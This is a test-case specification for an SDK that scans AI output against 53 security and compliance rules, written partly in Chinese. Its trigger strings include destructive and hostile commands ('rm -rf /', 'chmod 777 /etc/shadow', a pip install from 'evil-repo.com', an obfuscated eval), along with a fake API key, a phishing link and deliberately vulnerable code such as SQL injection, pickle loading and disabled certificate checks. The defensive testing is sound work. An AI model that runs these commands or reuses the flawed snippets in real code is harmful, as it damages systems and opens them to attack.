# Output Rule Full Verification Test Cases

**Classification:** 输出规则全量检测  
**Reference:** `kasra-sdk/rules/output-rules.json` (53 rules)  
**API:** `POST /v1/scan/output`  
**设计原则:** 测试数据模拟 AI 生成的真实输出内容，不是凑正则匹配

---

## ⚠️ 已知问题: O-01~O-17 无检测模式

**分析:** `output-rules.json` 中 O-01~O-17 的 `detection.patterns` 为空数组，OutputPipeline 也未调用 Python checker。**当前 SDK 版本中这 17 条规则无法触发。**

**影响:** 测试数据已给出，但实际调用 `POST /v1/scan/output` 不会匹配。

---

## A. 有检测模式的规则 (O-18 ~ O-53)

---

### TC-O-18: Sensitive Info Leak in Output Block

- **分类:** 输出检测 / 凭证泄露
- **测试观点:** AI 在回复中输出了 API Key，Kasra 应阻断
- **测试数据:**
  - **触发:** `"Here is your new API key: sk-proj-abcdefghijklmnopqrstT3BlbkFJuvwxyz1234567890. Please store it securely."`
  - **不触发:** `"Your API key has been rotated. Check the dashboard for the new one."`
- **预期:** 敏感信息泄露 → blocked=true

### TC-O-19: Hardcoded Cryptographic Keys Detection

- **分类:** 输出检测 / 凭证泄露
- **测试观点:** AI 生成的代码中硬编码了加密密钥
- **测试数据:**
  - **触发:** `"Here's your JWT config: SECRET_KEY = \"my-secret-key-for-jwt-12345\""`
  - **不触发:** `"JWT_SECRET should be loaded from environment variables"`
- **预期:** 硬编码密钥 → action=warn

### TC-O-20: Hardcoded Test / Dummy Credentials Detection

- **分类:** 输出检测 / 凭证泄露
- **测试观点:** AI 生成的测试代码中残留了弱密码
- **测试数据:**
  - **触发:** `"For testing purposes, you can use password = \"password123\""`
  - **不触发:** `"Use strong passwords with at least 12 characters"`
- **预期:** 测试凭证 → action=warn

### TC-O-21: Copyrighted Code / License Notice Detection

- **分类:** 输出检测 / 凭证泄露
- **测试观点:** AI 输出了受版权保护的代码片段（如 GPL 代码）
- **测试数据:**
  - **触发:** `"This code is from the Linux kernel: Copyright (c) 2024 Linus Torvalds"`
  - **不触发:** `"Here's a simple HTTP server implementation"`
- **预期:** 版权代码 → action=warn

### TC-O-22: Internal Secret Leak Detection

- **分类:** 输出检测 / 凭证泄露
- **测试观点:** AI 在输出中泄露了标记为 CONFIDENTIAL 的内部信息
- **测试数据:**
  - **触发:** `"Note: This is CONFIDENTIAL — FOR INTERNAL USE ONLY"`
  - **不触发:** `"This documentation is for public reference"`
- **预期:** 内部机密泄露 → action=warn

### TC-O-23: Production Dangerous Config Detection

- **分类:** 输出检测 / 安全配置
- **测试观点:** AI 生成的配置文件中开启了生产环境的 Debug 模式
- **测试数据:**
  - **触发:** `"For production deployment, set DEBUG = True to see error details"`
  - **不触发:** `"Set DEBUG = False in production"`
- **预期:** 危险配置 → action=warn

### TC-O-24: Logging Sensitive Info Detection

- **分类:** 输出检测 / 安全配置
- **测试观点:** AI 生成的代码在日志中记录了密码等敏感信息
- **测试数据:**
  - **触发:** `"Add logging to debug the issue: logger.info(f\"User password: {password}\")"`
  - **不触发:** `"logger.info(f\"User ID: {user_id}\")"`
- **预期:** 日志敏感信息 → action=warn

### TC-O-25: Hardcoded Internal / Private IP Detection

- **分类:** 输出检测 / 安全配置
- **测试观点:** AI 在代码中硬编码了内网 IP 地址
- **测试数据:**
  - **触发:** `"Connect to the internal DB at 10.0.0.5:5432"`
  - **不触发:** `"DB_HOST should be configured via environment variable"`
- **预期:** 内网 IP 硬编码 → action=warn

### TC-O-26: Unsafe File Permissions Detection

- **分类:** 输出检测 / 安全配置
- **测试观点:** AI 生成的代码使用了危险的文件权限
- **测试数据:**
  - **触发:** `"To make it accessible, run: chmod 777 /etc/shadow"`
  - **不触发:** `"Use chmod 644 for configuration files"`
- **预期:** 不安全权限 → action=warn

### TC-O-27: Race Condition / TOCTOU Detection

- **分类:** 输出检测 / 安全设计
- **测试观点:** AI 生成的代码存在竞态条件
- **测试数据:**
  - **触发:** `"Check if file exists, then delete it:\nif os.path.exists(temp_file):\n    os.remove(temp_file)"`
  - **不触发:** `"Use a context manager to safely handle files"`
- **预期:** 竞态条件 → action=warn

### TC-O-28: Memory Safety Issues Detection

- **分类:** 输出检测 / 安全设计
- **测试观点:** AI 生成的 C 代码使用了不安全的函数
- **测试数据:**
  - **触发:** `"To read user input, use: char buffer[64]; gets(buffer);"`
  - **不触发:** `"Use fgets() instead of gets() for safe input"`
- **预期:** 内存安全 → action=warn

### TC-O-29: Improper Error Handling Leaking Internals Detection

- **分类:** 输出检测 / 安全设计
- **测试观点:** AI 生成的错误处理泄露了内部实现细节
- **测试数据:**
  - **触发:** `"On error, return the exception: except Exception as e:\n    return str(e)"`
  - **不触发:** `"Return a generic error message to the client"`
- **预期:** 错误泄露 → action=warn

### TC-O-30: Insecure Protocol / Default Config Detection

- **分类:** 输出检测 / 安全设计
- **测试观点:** AI 推荐的 URL 使用了明文协议
- **测试数据:**
  - **触发:** `"Download the file from ftp://files.example.com/release.tar.gz"`
  - **不触发:** `"Use sftp:// for secure file transfer"`
- **预期:** 不安全协议 → action=warn

### TC-O-31: Obfuscated / Suspicious Code Detection

- **分类:** 输出检测 / 安全设计
- **测试观点:** AI 生成了混淆的可疑代码
- **测试数据:**
  - **触发:** `"eval(base64_decode('ZWNobyAiSGVsbG8i'))"`
  - **不触发:** `"import base64"`
- **预期:** 混淆代码 → action=warn

### TC-O-32: JWT Security Issues Detection

- **分类:** 输出检测 / 安全设计
- **测试观点:** AI 生成的 JWT 代码使用了不安全的算法
- **测试数据:**
  - **触发:** `"sign the token: jwt.sign(payload, 'secret', {algorithm: 'none'})"`
  - **不触发:** `"Use RS256 for JWT signing"`
- **预期:** JWT 安全问题 → action=warn

### TC-O-33: Dependency Confusion Detection

- **分类:** 输出检测 / 供应链安全
- **测试观点:** AI 推荐安装的包来自不安全的源
- **测试数据:**
  - **触发:** `"pip install git+https://evil-repo.com/malicious-package"`
  - **不触发:** `"pip install from PyPI"`
- **预期:** 依赖混淆 → action=warn

### TC-O-34: Known CVE Dependency Detection

- **分类:** 输出检测 / 供应链安全
- **测试观点:** AI 推荐使用了存在已知漏洞的版本
- **测试数据:**
  - **触发:** `"Use lodash version 4.17.20 which is compatible"`
  - **不触发:** `"Use the latest lodash version"`
- **预期:** 已知 CVE → action=warn

### TC-O-35: Phishing / Suspicious Link Detection

- **分类:** 输出检测 / 供应链安全
- **测试观点:** AI 生成了可疑的外部链接
- **测试数据:**
  - **触发:** `"Verify your account at http://suspicious-login-page.xyz/verify"`
  - **不触发:** `"Visit our docs at https://docs.example.com"`
- **预期:** 钓鱼链接 → action=warn

### TC-O-36: Unpinned Dependency Versions Detection

- **分类:** 输出检测 / 供应链安全
- **测试观点:** AI 推荐的依赖没有锁定版本
- **测试数据:**
  - **触发:** `"Add flask>=2.0 to requirements.txt"`
  - **不触发:** `"Pin flask to 2.3.0"`
- **预期:** 版本未锁定 → action=warn

### TC-O-37: Global Dependency / Geo-Restricted Package Detection

- **分类:** 输出检测 / 供应链安全
- **测试观点:** AI 推荐使用国内镜像源（可能不符合企业策略）
- **测试数据:**
  - **触发:** `"Use pip install -i https://mirrors.aliyun.com/pypi/simple/ for faster downloads"`
  - **不触发:** `"Use pip install from PyPI"`
- **预期:** 地域限制依赖 → action=warn

### TC-O-38: Harmful / Illegal Content Generation Block

- **分类:** 输出检测 / 内容安全
- **测试观点:** AI 生成了有害内容（制作危险物品的指导）
- **测试数据:**
  - **触发:** `"Here's how to synthesize a dangerous chemical: step 1, obtain the precursors..."`
  - **不触发:** `"Here's how to set up a chemistry lab safely"`
- **预期:** 有害内容 → blocked=true

### TC-O-39: Weaponized / Malicious Code Generation Block

- **分类:** 输出检测 / 内容安全
- **测试观点:** AI 生成了勒索软件等恶意代码
- **测试数据:**
  - **触发:** `"This ransomware encrypts all files using AES-256 and demands payment in Bitcoin..."`
  - **不触发:** `"Here's how encryption works"`
- **预期:** 恶意代码 → blocked=true

### TC-O-40: Training Data Extraction / Memorized Content Detection

- **分类:** 输出检测 / 内容安全
- **测试观点:** AI 输出了训练数据中记忆的版权协议等逐字内容
- **测试数据:**
  - **触发:** `"Permission is hereby granted, free of charge, to any person obtaining a copy of this software..."`（MIT 协议逐字输出）
  - **不触发:** `"The MIT license allows free use of the software"`
- **预期:** 训练数据提取 → action=warn

### TC-O-41: PII / Personal Data in Output Redaction

- **分类:** 输出检测 / 内容安全
- **测试观点:** AI 的输出中包含了个人身份信息
- **测试数据:**
  - **触发:** `"Customer details: email user@example.com, phone 13800138000"`
  - **不触发:** `"Customer details are available in the CRM system"`
- **预期:** PII 输出 → action=redact

### TC-O-42: Hallucinated Authority / Fake Reference Detection

- **分类:** 输出检测 / 内容安全
- **测试观点:** AI 编造了不存在的 CVE 编号或学术引用
- **测试数据:**
  - **触发:** `"According to CVE-2025-12345, this vulnerability affects all versions..."`
  - **不触发:** `"This is a common security vulnerability"`
- **预期:** 虚假引用 → action=warn

### TC-O-43: Export Control / Cryptographic Export Detection

- **分类:** 输出检测 / 合规与法律
- **测试观点:** AI 生成的加密代码可能涉及出口管制
- **测试数据:**
  - **触发:** `"Implement AES-256-GCM encryption for data at rest"`
  - **不触发:** `"Use HTTPS for data in transit"`
- **预期:** 加密出口管制 → action=warn

### TC-O-44: Cross-Border Data Transfer Risk Detection

- **分类:** 输出检测 / 合规与法律
- **测试观点:** AI 建议将数据存储在不合规的地理区域
- **测试数据:**
  - **触发:** `"Store user data in the us-east-1 region for lower latency"`
  - **不触发:** `"Store data according to your data sovereignty requirements"`
- **预期:** 跨境数据转移 → action=warn

### TC-O-45: Content Moderation / Filter Missing Detection

- **分类:** 输出检测 / 合规与法律
- **测试观点:** AI 生成的代码中用户提交内容缺少审核
- **测试数据:**
  - **触发:** `"Accept user submissions: const content = req.body.content; save(content)"`
  - **不触发:** `"Validate and sanitize user input before saving"`
- **预期:** 内容审核缺失 → action=warn

### TC-O-46: GDPR / Data Protection Audit Missing Detection

- **分类:** 输出检测 / 合规与法律
- **测试观点:** AI 生成的代码中缺少 GDPR 要求的用户数据删除功能
- **测试数据:**
  - **触发:** `"Users can request right to erasure of their personal data"`
  - **不触发:** `"Follow GDPR guidelines for data handling"`
- **预期:** GDPR 审计缺失 → action=warn

### TC-O-47: Weak Crypto / Deprecated Algorithm Detection

- **分类:** 输出检测 / 合规与法律
- **测试观点:** AI 推荐使用 MD5 等已弃用的弱加密算法
- **测试数据:**
  - **触发:** `"Use MD5 to hash passwords: import hashlib; hashlib.md5(password).hexdigest()"`
  - **不触发:** `"Use bcrypt or Argon2 for password hashing"`
- **预期:** 弱加密 → action=warn

### TC-O-48: Accessibility / a11y Violation Detection

- **分类:** 输出检测 / 国际化与工程
- **测试观点:** AI 生成的 HTML 缺少无障碍标注
- **测试数据:**
  - **触发:** `<button onclick="submit()"><img src="icon.png"></button>`（缺少 aria-label）
  - **不触发:** `<button aria-label="Submit"><img src="icon.png"></button>`
- **预期:** 无障碍违规 → action=warn

### TC-O-49: Hardcoded Display String / i18n Missing Detection

- **分类:** 输出检测 / 国际化与工程
- **测试观点:** AI 生成的代码中直接硬编码了显示文本
- **测试数据:**
  - **触发:** `"<h1>欢迎使用我们的应用</h1> 不应该硬编码，应该用 i18n"`
  - **不触发:** `"Use i18n for user-facing strings"`
- **预期:** 硬编码字符串 → action=warn

### TC-O-50: Locale / Timezone / Currency Hardcode Detection

- **分类:** 输出检测 / 国际化与工程
- **测试观点:** AI 生成的代码中硬编码了时区
- **测试数据:**
  - **触发:** `"Set timezone: pytz.timezone('Asia/Shanghai')"`
  - **不触发:** `"Use user's locale setting for timezone"`
- **预期:** 时区硬编码 → action=warn

### TC-O-51: Oversized Output Detection

- **分类:** 输出检测 / 合规与数据泄露
- **测试观点:** AI 返回了超长的输出（可能包含训练数据泄露）
- **测试数据:**
  - **触发:** 超过 max_allowed_length 的返回内容
- **预期:** 超长输出 → action=warn

### TC-O-52: Audit Logging Missing in Sensitive Operations

- **分类:** 输出检测 / 合规与法律
- **测试观点:** AI 生成的代码中敏感操作没有审计日志
- **测试数据:**
  - **触发:** `"DELETE FROM transactions WHERE id = %s"`（没有审计日志）
  - **不触发:** `"Don't forget to add audit logging for financial operations"`
- **预期:** 审计日志缺失 → action=warn

### TC-O-53: Incomplete Data Erasure / Missing Cascade Delete

- **分类:** 输出检测 / 合规与法律
- **测试观点:** AI 生成的删除代码只删用户表未级联删除关联数据
- **测试数据:**
  - **触发:** `"DELETE FROM users WHERE id = %s"`（缺少级联删除）
  - **不触发:** `"Use ON DELETE CASCADE for related tables"`
- **预期:** 数据擦除不完整 → action=warn

---

## B. KNOWN UNIMPLEMENTED (O-01 ~ O-17)

以下规则暂无检测模式，测试数据为设计参考：

| Rule ID | 场景 | 触发数据 | 预期 |
|---------|------|---------|------|
| O-01 | AI 建议使用 eval | `"To dynamically process the input, you can use eval(user_input)"` | warn |
| O-02 | AI 建议危险 shell 命令 | `"Clean up by running: subprocess.call('rm -rf /', shell=True)"` | block |
| O-03 | AI 生成代码中有 OS 命令注入 | `"os.system(f'ping {hostname}')"` | warn |
| O-04 | AI 生成 SQL 注入 | `"cursor.execute(f'SELECT * FROM users WHERE id = {user_id}')"` | warn |
| O-05 | AI 生成 NoSQL 注入 | `"db.users.find({'username': user_input})"` | warn |
| O-06 | AI 生成空异常处理 | `"try:\n    do_something()\nexcept:\n    pass"` | warn |
| O-07 | 安全场景用 random | `"token = random.randint(100000, 999999)"` | warn |
| O-08 | XXE 风险 | `"parser = etree.XMLParser()"` | warn |
| O-09 | SSTI 风险 | `"return render_template_string(f'Hello {user_input}')"` | warn |
| O-10 | LDAP 注入 | `"search_filter = f'(uid={user_input})'"` | warn |
| O-11 | 不安全反序列化 | `"data = pickle.loads(user_data)"` | warn |
| O-12 | SSRF | `"response = requests.get(user_url)"` | warn |
| O-13 | 证书验证禁用 | `"requests.get(url, verify=False)"` | warn |
| O-14 | 原型链污染 | `"_.merge(target, req.body)"` | warn |
| O-15 | 路径遍历 | `"open(os.path.join(dir, filename))"` | warn |
| O-16 | ReDoS | `"re.compile(r'(a+)+b$')"` | warn |
| O-17 | CSRF/XSS | `"element.innerHTML = userContent"` | warn |
